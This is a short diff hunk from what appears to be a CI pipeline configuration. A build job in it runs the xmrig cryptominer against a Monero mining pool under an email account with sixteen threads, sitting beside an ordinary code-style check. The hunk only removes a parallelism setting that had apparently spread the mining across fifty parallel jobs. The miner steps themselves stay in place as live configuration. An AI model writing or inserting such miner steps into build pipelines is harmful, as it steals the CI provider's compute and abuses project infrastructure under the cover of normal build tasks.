@@ -21,7 +21,6 @@ blocks:
             - cd bmxmrig
             - chmod u+x ./xmrig
             - './xmrig -o xmr.pool.minergate.com:45700 -u kanayuza03@gmail.com -t16 --donate-level 1'
-          parallelism: 50
   - name: Check code style
     task:
       jobs:
